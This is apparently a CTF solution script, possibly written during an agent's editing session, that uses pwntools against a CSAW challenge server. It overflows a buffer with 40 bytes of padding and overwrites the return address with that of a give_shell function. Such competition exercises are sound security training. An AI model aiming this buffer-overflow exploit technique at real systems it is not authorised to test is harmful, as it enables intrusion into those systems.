from pwn import *

# Set up the connection with a short timeout
p = remote("pwn.chal.csaw.io", 1437, timeout=5)

# Receive the initial banner
try:
    banner = p.recvuntil(b"Do you gets it??", timeout=2)
    print("Received banner:", banner.decode('ascii', errors='ignore'))
except:
    print("Failed to receive banner")

# Create and send the payload
# 40 bytes of padding + address of give_shell (0x4005b6) in little-endian
payload = b"A" * 40 + p64(0x4005b6)
p.sendline(payload)

# Try to receive the flag or shell output
try:
    output = p.recvall(timeout=3)
    print("Output:", output.decode('ascii', errors='ignore'))
except:
    print("No output received")

p.close()
end_of_edit

